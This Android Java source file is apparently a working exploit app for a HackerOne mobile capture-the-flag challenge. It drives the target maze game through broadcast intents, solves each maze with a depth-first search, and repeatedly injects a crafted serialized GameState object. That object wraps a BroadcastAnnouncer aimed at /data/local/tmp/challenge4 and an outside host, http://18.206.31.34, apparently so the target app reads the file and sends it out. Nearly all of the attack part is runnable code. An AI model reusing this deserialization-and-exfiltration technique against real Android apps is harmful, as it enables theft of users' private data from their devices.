package com.fpasswdpwn.challenge4_exploit;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.Handler;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;

import com.hackerone.mobile.challenge4.BroadcastAnnouncer;
import com.hackerone.mobile.challenge4.GameState;
import com.hackerone.mobile.challenge4.StateController;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.HashMap;

public class MainActivity extends AppCompatActivity {
    boolean wallsReady = false;
    boolean positionsReady = false;
    boolean[][] walls;
    ArrayList<Integer> positions = new ArrayList<>();
    ArrayList<Character> solutions = null;
    ArrayList<Integer> solutionsX = null;
    ArrayList<Integer> solutionsY = null;
    public static int mazeSolved = 0;
    public BroadcastReceiver recv = null;
    boolean[][] visited;
    private static final int[] dx = {-1, 0, 0, 1};
    private static final int[] dy = {0, -1, 1, 0};
    private static final char[] dir = {'h', 'k', 'j', 'l'};
    public static int counter = 0;
    public BroadcastReceiver recv1 = null;
    boolean solving = false;
    HashMap<boolean[][], Boolean> solved = new HashMap<>();
    static boolean pwned = false;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        recv1 = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d(pwn.pwnTag, "onReceive is called");
                Bundle extras = intent.getExtras();
                if (extras != null) {
                    if (intent.hasExtra("move")) {
                        Log.d(pwn.pwnTag, "move is received");
                        String x = extras.getString("move");
                        Character c = x.charAt(0);
                        Log.d(pwn.pwnTag, "Move is " + String.valueOf(c));
                        Intent moveIntent = new Intent();
                        moveIntent.putExtra("move", c);
                        moveIntent.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
                        context.sendBroadcast(moveIntent);
                        Log.d(pwn.pwnTag, "move sent");
                    }
                    if (intent.hasExtra("start_game")) {
                        Log.d(pwn.pwnTag, "start_game rececived");
                        Intent startMaze = new Intent();
                        startMaze.setAction("com.hackerone.mobile.challenge4.menu");
                        startMaze.putExtra("start_game", "");
                        context.sendBroadcast(startMaze);
                        Log.d(pwn.pwnTag, "start_game sent");
                    }
                    if (intent.hasExtra("get_maze")) {
                        Log.d(pwn.pwnTag, "get_maze received");
                        Intent getMaze = new Intent();
                        getMaze.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
                        getMaze.putExtra("get_maze", "");
                        context.sendBroadcast(getMaze);
                        Log.d(pwn.pwnTag, "get_maze sent");
                    }
                    if (intent.hasExtra("cereal") || intent.hasExtra("pwn")) {
                        Log.d(pwn.pwnTag, "cereal received");
                        Intent pwnshit = new Intent();
                        pwnshit.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
                        String filePath = "/data/local/tmp/challenge4";
                        Log.d(pwn.pwnTag, "filePath = " + filePath);
                        StateController pwnStateLoader = new BroadcastAnnouncer("MazeGame", filePath, "http://18.206.31.34");
                        Serializable payload1 = new GameState("PWNED", pwnStateLoader);
                        Intent pwnshit1 = new Intent();
                        pwnshit1.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
                        pwnshit1.putExtra("cereal", payload1);
                        context.sendBroadcast(pwnshit1);
                        Log.d(pwn.pwnTag, "cereal payload1 sent");
                        Log.d(pwn.pwnTag, "cereal sent");
                    }
                }
            }
        };
        registerReceiver(recv1, new IntentFilter("com.fpasswdpwn.challenge4_exploit.exploit"));

        recv = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {

                Bundle extras = intent.getExtras();
                if (extras != null) {
                    if (intent.hasExtra("move_result")) {
                        Log.d(pwn.pwnTag, "move_result received");
                        String moveResult = extras.getString("move_result");
                        Log.d(pwn.pwnTag, "move_result: " + moveResult);
                    }
                    if (intent.hasExtra("walls")) {
                        Log.d(pwn.pwnTag, "walls received");
                        if (!wallsReady) {
                            walls = (boolean[][]) extras.getSerializable("walls");
                            Log.d(pwn.pwnTag, "walls length = " + walls.length);
//                            String wallsString = "\n";
//                            for (int i = 0; i < walls.length; i++) {
//                                for (int j = 0; j < walls.length; j++) {
//                                    wallsString += walls[i][j] ? "1 " : "0 ";
//                                }
//                                wallsString += "\n";
//                            }
//                            Log.d(pwn.pwnTag, "walls = " + wallsString);
                            wallsReady = true;
                            if (wallsReady && positionsReady) {
                                solving = true;
                                if (!solved.containsKey(walls)) {
                                    solveMaze();
                                    solved.put(walls, true);
                                }
                                solving = false;
                                wallsReady = false;
                                positionsReady = false;
                                walls = null;
                                positions = null;
                                return;
                            }
                        }
                    }
                    if (intent.hasExtra("positions")) {
                        Log.d(pwn.pwnTag, "positions rececived");
                        if (!positionsReady) {
                            positions = extras.getIntegerArrayList("positions");
                            Log.d(pwn.pwnTag, "positions length = " + positions.size());
//                            String positionsString = "";
//                            for (int i = 0; i < positions.size(); i++) {
//                                positionsString += " " + Integer.toString(positions.get(i));
//                            }
//                            Log.d(pwn.pwnTag, "positions = " + positionsString);
                            positionsReady = true;
                            if (wallsReady && positionsReady) {
                                solving = true;
                                if (!solved.containsKey(walls)) {
                                    solveMaze();
                                    solved.put(walls, true);
                                }
                                solving = false;
                                wallsReady = false;
                                positionsReady = false;
                                walls = null;
                                positions = null;
                            }
                        }
                    }
                }
            }
        };

        registerReceiver(recv, new IntentFilter("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER"));

        //Intent svc = new Intent(this, pwnService.class);
        //startService(svc);

        Intent launchIntent = getPackageManager().getLaunchIntentForPackage("com.hackerone.mobile.challenge4");
        startActivity(launchIntent);
//        if (launchIntent != null) {
//            if (!Helper.isAppRunning(this, "com.hackerone.mobile.challenge4")) {
//                startActivity(launchIntent);//null pointer check in case package name was not found
//            }
//        }

        Handler handler = new Handler();

        pwned = true;
        // Start the game
        final Intent startMaze = new Intent();
        startMaze.setAction("com.hackerone.mobile.challenge4.menu");
        startMaze.putExtra("start_game", "");
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendBroadcast(startMaze);
                Log.d(pwn.pwnTag, "Broadcast sent, game should be starting");
            }
        }, 5000);

        // Solve for 3 maze and make a move in the 4th maze


        for (int i = 1, delay = 10000; i <= 10; i++, delay += 10000) {
            final Intent getMaze = new Intent();
            getMaze.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
            getMaze.putExtra("get_maze", "");

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendBroadcast(getMaze);
                    Log.d(pwn.pwnTag, "get_maze sent");
                }
            }, delay);

            // Trigger the exploit
            final Intent i1 = new Intent();
            i1.setAction("com.fpasswdpwn.challenge4_exploit.exploit");
            i1.putExtra("cereal", "");

            Intent pwnshit = new Intent();
            pwnshit.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
            String filePath = "/data/local/tmp/challenge4";
            Log.d(pwn.pwnTag, "filePath = " + filePath);
            StateController pwnStateLoader = new BroadcastAnnouncer("MazeGame", filePath, "http://18.206.31.34");
            Serializable payload1 = new GameState("PWNED", pwnStateLoader);
            final Intent pwnshit1 = new Intent();
            pwnshit1.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
            pwnshit1.putExtra("cereal", payload1);
            sendBroadcast(pwnshit1);
            Log.d(pwn.pwnTag, "cereal payload1 sent");
            Log.d(pwn.pwnTag, "cereal sent");

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
//                    sendBroadcast(i1);
//                    Log.d(pwn.pwnTag, "exploit sent");
                    sendBroadcast(pwnshit1);
                    Log.d(pwn.pwnTag, "cereal payload1 sent");
                    Log.d(pwn.pwnTag, "cereal sent");
                }
            }, delay + 2000);
        }

    }

    public void solveMaze() {
        Log.d(pwn.pwnTag, "start solving maze");
        visited = new boolean[100][100];
        solutions = new ArrayList<>();
        solutionsX = new ArrayList<>();
        solutionsY = new ArrayList<>();

        for (int i = 0; i < 100; i++) {
            for (int j = 0; j < 100; j++) {
                visited[i][j] = false;
            }
        }
        boolean found = DFS(positions.get(0), positions.get(1), positions.get(2), positions.get(3));
        if (found) {
            Log.d(pwn.pwnTag, "Path found");
            String path = "";
            for (int i = 0; i < solutions.size(); i++) {
                path += solutions.get(i);
                Log.d(pwn.pwnTag, "" + solutionsX.get(i) + " " + solutionsY.get(i));
            }
            Log.d(pwn.pwnTag, "PATH = " + path);
            solutions = finalizeSolution(solutions);
            path = "";
            for (int i = 0; i < solutions.size(); i++) {
                path += solutions.get(i);
            }
            Log.d(pwn.pwnTag, "FINALIZED PATH = " + path);
            for (int i = 0; i < solutions.size(); i++) {
                Intent makeMove = new Intent();
//                makeMove.setAction("com.fpasswdpwn.challenge4_exploit.exploit");
//                makeMove.putExtra("move", "" + solutions.get(i));
                makeMove.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
                makeMove.putExtra("move", solutions.get(i));
                sendBroadcast(makeMove);
                Log.d(pwn.pwnTag, "solution move sent");
            }
        }
        mazeSolved += 1;
        Log.d(pwn.pwnTag, "finished solving maze");
    }

    public boolean isInside(int x, int y) {
        return 0 <= x && x < walls.length && 0 <= y && y < walls.length;
    }

    public ArrayList<Character> finalizeSolution(ArrayList<Character> lst) {
        ArrayList<Character> finalSolution = new ArrayList<>();
        for (int i = 0; i < lst.size(); i++) {
            char m = lst.get(i);
            int x = solutionsX.get(i);
            int y = solutionsY.get(i);

            if (m == 'h' || m == 'l') {
                if (walls[y - 1][x] || walls[y + 1][x]) {
                    finalSolution.add(m);
                }
            } else if (m == 'j' || m == 'k') {
                if (walls[y][x - 1] || walls[y][x + 1]) {
                    finalSolution.add(m);
                }
            }
        }
        finalSolution.add(lst.get(lst.size() - 1));
        return finalSolution;
    }

    public boolean DFS(int playerX, int playerY, int destX, int destY) {
        visited[playerX][playerY] = true;
        if (playerX == destX && playerY == destY) {
            return true;
        }
        for (int i = 0; i < 4; i++) {
            int x = playerX + dx[i];
            int y = playerY + dy[i];
            if (!isInside(x, y)) {
                continue;
            }
            if (visited[x][y] || (!walls[y][x])) {
                continue;
            }
            boolean found = DFS(x, y, destX, destY);
            if (found) {
                solutions.add(0, dir[i]);
                solutionsX.add(0, x);
                solutionsY.add(0, y);
                return found;
            }
        }
        return false;
    }

}
